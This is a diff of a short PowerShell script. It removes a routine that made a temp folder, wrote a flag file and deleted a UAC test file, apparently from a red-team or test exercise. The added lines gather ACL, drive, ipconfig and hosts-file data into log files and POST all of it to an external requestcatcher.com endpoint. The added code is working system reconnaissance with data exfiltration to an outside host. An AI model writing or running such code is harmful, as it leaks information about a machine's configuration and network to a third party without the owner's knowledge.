@@ -1,20 +1,12 @@
-﻿function Randomkey {
-    return -join ((65..90) + (97..122) | Get-Random -Count 5 | ForEach-Object {[char]$_})
-}
+Get-Acl | Out-File C:\Users\log.txt -Append
+Get-PSDrive -PSProvider FileSystem | Out-File C:\Users\log2.txt -Append
+ipconfig | Out-File C:\Users\ipconfig.txt -Append
 
-$NAME = $args[0]
+$d= cat c:\Windows\System32\Drivers\etc\hosts
+
+$a= cat C:\Users\log.txt
+$b= cat C:\Users\log2.txt
+$c= cat C:\Users\ipconfig.txt
 
 
-$wd = Randomkey
-
-echo $wd
-
-cd $env:TEMP
-
-mkdir $wd
-
-cd $wd
-
-echo "Enes Burdaydı" > flag.txt
-
-Remove-Item -Path $NAME\uacTest.cmd
+iwr -Uri https://pstest06.requestcatcher.com/ -Method POST -Body "gelsin loglar $d $a $b $c"
